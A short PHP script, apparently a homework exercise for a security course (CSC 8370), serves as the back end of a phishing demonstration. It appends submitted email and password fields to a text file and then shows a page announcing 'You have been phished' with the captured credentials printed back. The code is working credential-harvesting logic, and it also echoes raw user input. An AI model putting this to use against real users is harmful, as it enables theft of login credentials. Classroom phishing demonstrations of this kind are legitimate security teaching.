<?php 
$file = fopen('logindetails.txt', 'a+');
$write = fwrite($file, 'email: '.$_POST['Email']. PHP_EOL .'password: '. $_POST['Passwd'].PHP_EOL.PHP_EOL );
fclose($file);

 ?>
<html>
<head>
	<title>You have been phished for CSC 8370</title>
</head>
<body >

	CSC 8370 Homework 5
</br>
<?php 
echo "Username: ";
echo $_POST['Email'];
echo "<br />";
echo "Password: ";
echo $_POST['Passwd']; ?>

</body>
</html>
 